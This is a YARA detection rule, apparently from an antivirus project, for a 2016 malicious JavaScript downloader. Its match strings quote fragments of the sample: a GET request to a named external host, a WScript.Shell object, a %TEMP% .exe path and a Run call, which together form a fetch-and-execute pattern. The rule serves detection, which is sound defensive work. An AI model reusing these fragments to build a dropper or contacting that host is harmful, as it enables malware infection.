rule sig_20160330_e9d78eddb9feb8584579d580be99a635 {
  meta:
    description = "datamaliciousorder - file 20160330_e9d78eddb9feb8584579d580be99a635.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a587129ab6da276c3ba313aaed4ae0a8d112955bdc7b9c2d26f1876ecfd78802"

  strings:
    $s1  = "_W1[_J0](\"GET\", \"http://rocketsrange.com/b5ksa\", false);" fullword ascii
    $s2  = "var _PW = function _W() {return WScript[_B](\"WScript\"+\".Shell\");}(), _QA = 11;" fullword ascii
    $s3  = "function _BA(_R1, _TU){_R = _R * 1; return _R1 - _TU;};" fullword ascii
    $s4  = "if (_W1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _MK(){return _RI + \"\";};" fullword ascii
    $s6  = "function _YQ() {return _PW[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"WcYq5BoK2N.ex\" + \"e\";};" fullword ascii
    $s7  = "function _W0(_Q0){_PW[\"Run\"](_Q0, _R, _R);};" fullword ascii
    $s8  = "function _X() {return ((_YW == true) && (_YW == _OE)) ? 1 : _R;};" fullword ascii
    $s9  = "function _Q()" fullword ascii
    $s10 = "var _A0 = new this[\"Date\"]();" fullword ascii
    $s11 = " while (_LD){" fullword ascii
    $s12 = "function _UU(){return 22;};" fullword ascii
    $s13 = "function _J(_D) {var _M = (1, 2, 3, 4, 5, _D); return _M;};" fullword ascii
    $s14 = "return _BA(_Y, _R0);" fullword ascii
    $s15 = "function _A(){return _B;};" fullword ascii
    $s16 = "var _EA = false;" fullword ascii
    $s17 = "_YW = true; " fullword ascii
    $s18 = "var _YW = false;" fullword ascii
    $s19 = "_OE = true; " fullword ascii
    $s20 = "var _OE = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}